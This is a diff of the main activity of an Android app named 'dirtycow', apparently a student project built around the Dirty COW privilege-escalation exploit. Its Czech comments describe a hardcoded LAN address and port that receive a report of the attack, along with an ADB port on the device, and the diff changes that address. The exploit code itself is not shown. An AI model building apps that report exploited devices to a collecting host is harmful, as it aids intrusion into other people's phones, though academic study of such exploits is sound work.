@@ -1,9 +1,14 @@
+// Autor: Vit Soucek (soucevi1@fit.cvut.cz)
+// Zdroje prevzateho kodu jsou uvedeny primo u danych prevzatych casti.
+
 package com.bp.dirtycow;
 
 import android.content.IntentFilter;
+import android.content.pm.PermissionInfo;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
+import android.support.v4.content.PermissionChecker;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
 import android.util.Patterns;
@@ -16,6 +21,8 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
+import java.security.Permission;
+import java.security.Permissions;
 import java.util.Collections;
 import java.util.List;
 
@@ -23,8 +30,8 @@ public class MainActivity extends AppCompatActivity implements ConnectionReceive
 
     private static String APP_TAG = "DIRTY_COW";    // Tag, ktery se zobrazi u vypisu
     private int SERVER_PORT = 6666;                 // Port, na ktery odejde zprava o utoku
-    private String IP_ADDRESS = "192.168.10.13";    // Adresa, na kterou odejde zprava o utoku
-    private int ADB_PORT = 5556;                       // Port, na kterem posloucha ADB na zarizeni
+    private String IP_ADDRESS = "192.168.0.102";    // Adresa, na kterou odejde zprava o utoku
+    private int ADB_PORT = 5556;                    // Port, na kterem posloucha ADB na zarizeni
 
     private CClient mClient;
     private String ADBport = "0";
@@ -270,7 +277,6 @@ public class MainActivity extends AppCompatActivity implements ConnectionReceive
     //      zdroj: https://stackoverflow.com/a/13506836/6136143
     private StringBuilder getProcessOutput(InputStream inputStream) throws IOException {
         BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
-        // Grab the results
         StringBuilder log = new StringBuilder();
         String line;
         while ((line = bufferedReader.readLine()) != null) {
